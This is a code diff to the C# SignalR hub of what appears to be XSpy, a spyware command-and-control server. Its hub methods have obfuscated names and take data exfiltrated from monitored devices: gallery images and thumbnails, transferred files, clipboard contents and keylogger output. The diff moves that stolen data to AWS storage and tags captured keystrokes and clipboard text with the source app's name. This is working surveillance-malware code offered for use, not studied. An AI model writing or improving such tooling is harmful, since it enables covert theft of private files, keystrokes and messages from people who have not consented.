@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Linq;
 using System.Security.Claims;
 using System.Threading.Tasks;
 using Microsoft.AspNetCore.Authorization;
@@ -13,6 +14,7 @@ using XSpy.Database.Services;
 using XSpy.Database.XSpy.Shared.Models.Interfaces;
 using XSpy.Shared.DataTransfer;
 using XSpy.Shared.Models.Requests.Devices;
+using XSpy.Utils;
 using File = System.IO.File;
 
 namespace XSpy.Socket
@@ -23,22 +25,16 @@ namespace XSpy.Socket
         private readonly HubMethods _methods;
         private readonly UserService _userService;
         private readonly DeviceService _deviceService;
+        private readonly AwsService _awsService;
 
-        private string _fileRoot;
-        private string _savePath;
 
         public MainHub(HubMethods hubMethods, DeviceService deviceService, UserService userService,
-            IHostEnvironment env)
+            IHostEnvironment env, AwsService awsService)
         {
+            _awsService = awsService;
             _userService = userService;
             _deviceService = deviceService;
             _methods = hubMethods;
-            _savePath = Path.Combine("external", "devices");
-            _fileRoot = Path.Combine(env.ContentRootPath, "wwwroot");
-            if (Directory.Exists(Path.Combine(_fileRoot, _savePath)))
-            {
-                Directory.CreateDirectory(Path.Combine(_fileRoot, _savePath));
-            }
         }
 
         public override async Task OnConnectedAsync()
@@ -88,12 +84,38 @@ namespace XSpy.Socket
             var pathRequest = JsonConvert.DeserializeObject<List<LoadPathData>>(request);
             await _deviceService.ListPath(GetDeviceId(), pathRequest);
         }
-        
+
         //List Gallery
         public async Task _0xGI(string request)
         {
-            var pathRequest = JsonConvert.DeserializeObject<List<string>>(request);
-            await _deviceService.ImageList(GetDeviceId(), pathRequest);
+            var pathRequest = JsonConvert.DeserializeObject<List<SaveGalleryRequest>>(request);
+            var needThumb = await _deviceService.ImageList(GetDeviceId(), pathRequest);
+
+            if (needThumb.Count > 0)
+            {
+                var client = Clients.Client(Context.ConnectionId);
+
+                foreach (var thumb in needThumb)
+                {
+                    await client.SendAsync("0xTB", thumb.ImageId, thumb.Path);
+                }
+
+            }
+        }
+
+        //Get Gallery thumbs
+        public async Task _0xTB(string request)
+        {
+            var fileRequest = JsonConvert.DeserializeObject<TransferFileRequest>(request);
+            var device = GetDeviceId();
+
+            string[] split = fileRequest.Path.Split('/');
+
+            var fileUrl = await _awsService.UploadFile(fileRequest.Buffer, fileRequest.ContentType,
+                Path.Combine("devices", device, fileRequest.Type, fileRequest.Path.Replace(".", null)),
+                split.Last());
+
+            await _deviceService.SaveImageThumb(GetDeviceId(), fileUrl, fileRequest.Path);
         }
 
 
@@ -101,14 +123,13 @@ namespace XSpy.Socket
         public async Task _0xFD(string request)
         {
             var fileRequest = JsonConvert.DeserializeObject<TransferFileRequest>(request);
-            var file = await _deviceService.StoreFile(GetDeviceId(), _savePath, fileRequest);
 
-            if (!Directory.Exists(Path.Combine(_fileRoot, _savePath, file.DeviceId.ToString(), fileRequest.Type)))
-            {
-                Directory.CreateDirectory(Path.Combine(_fileRoot, _savePath, file.DeviceId.ToString(), fileRequest.Type));
-            }
-            
-            await File.WriteAllBytesAsync(Path.Combine(_fileRoot, file.SavedPath), fileRequest.Buffer);
+            var device = GetDeviceId();
+            var fileUrl = await _awsService.UploadFile(fileRequest.Buffer, fileRequest.ContentType,
+                Path.Combine("devices", device, fileRequest.Type, fileRequest.Path),
+                fileRequest.Name);
+
+            await _deviceService.StoreFile(device, fileUrl, fileRequest);
         }
 
 
@@ -162,14 +183,12 @@ namespace XSpy.Socket
         {
             var fileRequest = JsonConvert.DeserializeObject<TransferFileRequest>(request);
 
-            var file = await _deviceService.StoreFile(GetDeviceId(), _savePath, fileRequest);
+            var device = GetDeviceId();
+            var fileUrl = await _awsService.UploadFile(fileRequest.Buffer, fileRequest.ContentType,
+                Path.Combine("devices", device, fileRequest.Type, fileRequest.Path),
+                fileRequest.Name);
 
-            if (!Directory.Exists(Path.Combine(_fileRoot, _savePath, file.DeviceId.ToString(), fileRequest.Type)))
-            {
-                Directory.CreateDirectory(Path.Combine(_fileRoot, _savePath, file.DeviceId.ToString(), fileRequest.Type));
-            }
-
-            await File.WriteAllBytesAsync(Path.Combine(_fileRoot, file.SavedPath), fileRequest.Buffer);
+            await _deviceService.StoreFile(device, fileUrl, fileRequest);
         }
 
         //PERM. List
@@ -202,15 +221,15 @@ namespace XSpy.Socket
         }
 
         //ClipBoard
-        public async Task _0xCB(string word)
+        public async Task _0xCB(string word, string appName)
         {
-            await _deviceService.SaveWords(GetDeviceId(), word, true);
+            await _deviceService.SaveWords(GetDeviceId(), word, appName, true);
         }
 
         //Save words - key logger
-        public async Task _0xKL(string words)
+        public async Task _0xKL(string words, string appName)
         {
-            await _deviceService.SaveWords(GetDeviceId(), words, false);
+            await _deviceService.SaveWords(GetDeviceId(), words, appName, false);
         }
 
         private string GetDeviceId()
